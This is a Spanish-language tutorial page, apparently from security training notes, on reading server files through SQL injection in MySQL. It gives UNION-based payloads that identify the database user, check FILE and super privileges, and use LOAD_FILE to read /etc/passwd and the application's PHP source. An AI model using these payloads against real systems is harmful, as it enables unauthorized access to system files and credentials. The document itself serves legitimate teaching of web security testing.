# Lectura de archivos

## Privilegios

Leer datos es mucho más común que escribir datos, que están estrictamente reservados para usuarios privilegiados en los DBMS modernos, ya que puede conducir a la explotación del sistema, como veremos. Por ejemplo, en `MySQL`, el usuario de la base de datos debe tener el `FILE` privilegio de cargar el contenido de un archivo en una tabla y luego volcar datos de esa tabla y leer archivos. Entonces, comencemos recopilando datos sobre nuestros privilegios de usuario dentro de la base de datos para decidir si leeremos y/o escribiremos archivos en el servidor back-end.

{% stepper %}
{% step %}
### Usuario de base de datos

Es importante identificar qué usuario somos dentro de la base de datos para saber qué privilegios tenemos. En los sistemas modernos, normalmente solo los administradores de base de datos (DBA) poseen permisos amplios, como leer archivos del sistema. Si somos DBA, es más probable que tengamos esos privilegios.

Podemos utilizar cualquiera de las siguientes consultas:

```sql
SELECT USER();
SELECT CURRENT_USER();
SELECT user from mysql.user;
```

Ejemplo de payload `UNION` para descubrir el usuario actual:

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

o:

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

Resultado de ejemplo (se muestra el usuario actual `root`):

![Interfaz de búsqueda con un cuadro de texto y un botón denominado 'Buscar'. A continuación se muestra una tabla con columnas: Código del puerto, Ciudad del puerto y Volumen del puerto. La entrada incluye root@localhost, 3 y 4](../../.gitbook/assets/db_user.jpg)

Si el usuario es `root`, es probable que sea DBA y tenga muchos privilegios.
{% endstep %}

{% step %}
### Privilegios del usuario

Ahora que conocemos a nuestro usuario, podemos empezar a buscar qué privilegios tenemos con ese usuario.

Para probar si tenemos privilegios de super administrador:

```sql
SELECT super_priv FROM mysql.user;
```

Payload `UNION` correspondiente:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

Si hay muchos usuarios en el DBMS, filtrar por usuario:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

Ejemplo de salida que muestra `Y` (YES) para privilegios de super usuario:

![Interfaz de búsqueda con un cuadro de texto y un botón denominado 'Buscar'. A continuación se muestra una tabla con columnas: Código del puerto, Ciudad del puerto y Volumen del puerto. La entrada incluye root@localhost, 3 y 4](../../.gitbook/assets/root_privs.jpg)

También podemos volcar otros privilegios desde el esquema `information_schema`:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

Para mostrar solo privilegios del usuario actual (`root`):

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

Ejemplo de salida que muestra privilegios (incluye `FILE`):

![Interfaz de búsqueda con un cuadro de texto que contiene 'cn' UNION SELECT 1, grant' y un botón denominado 'Buscar'. A continuación se muestra una tabla con columnas: Código del puerto, Ciudad del puerto y Volumen del puerto. Las entradas incluyen 'root'@'localhost' con valores de Port City como SELECT, INSERT, UPDATE y Port Volume 4](../../.gitbook/assets/root_privs_2.jpg)

Si el privilegio `FILE` está listado para nuestro usuario, podremos leer archivos (y potencialmente escribirlos).
{% endstep %}

{% step %}
### Leer archivos con LOAD\_FILE()

Ahora que sabemos que tenemos suficientes privilegios para leer archivos del sistema local, podemos usar la función `LOAD_FILE()`.

La función `LOAD_FILE()` (documentada en MariaDB/MySQL) se utiliza para leer datos de archivos. Acepta un argumento: el nombre del archivo.

Ejemplo para leer `/etc/passwd`:

```sql
SELECT LOAD_FILE('/etc/passwd');
```

Nota: Solo podremos leer el archivo si el usuario del sistema operativo que ejecuta MySQL tiene permisos de lectura sobre ese archivo.

Ejemplo de payload `UNION`:

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

Salida de ejemplo mostrando el contenido de `passwd`:

![Interfaz de búsqueda con un cuadro de texto y un botón denominado 'Buscar'. A continuación se muestra una tabla con columnas: Código del puerto, Ciudad del puerto y Volumen del puerto. Las entradas incluyen información del usuario como root:x:0:0:root:/root:/bin/bash y daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin](../../.gitbook/assets/load_file_sqli.png)

Hemos leído con éxito el contenido de `/etc/passwd`. Esto también podría usarse para filtrar el código fuente de la aplicación.
{% endstep %}
{% endstepper %}

***

### Otro ejemplo

Sabemos que la página actual es `search.php`. La raíz web predeterminada de Apache es `/var/www/html`. Intentemos leer el código fuente del archivo en `/var/www/html/search.php`:

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

Resultado: la página representa el código HTML en el navegador; la fuente HTML se puede ver con \[Ctrl + U].

![Interfaz de búsqueda con un cuadro de texto y un botón denominado 'Buscar'. A continuación se muestra una tabla con columnas: Código del puerto, Ciudad del puerto y Volumen del puerto.](../../.gitbook/assets/load_file_search.png)

La fuente HTML / PHP mostrada (fragmento):

![Fragmento de código PHP para consultar una base de datos. Comprueba si 'port\_code' está configurado, construye una consulta SQL para seleccionar entre 'puertos' donde el código coincide, ejecuta la consulta y obtiene resultados](../../.gitbook/assets/load_file_source.png)

El código fuente puede contener credenciales de conexión a la base de datos u otras informaciones sensibles que conviene inspeccionar para encontrar más vulnerabilidades.

{% hint style="info" %}
La capacidad de leer archivos depende tanto de los privilegios del usuario de la base de datos en el DBMS (por ejemplo, el privilegio `FILE`) como de los permisos del sistema de ficheros del usuario del SO que ejecuta el servicio de base de datos.
{% endhint %}
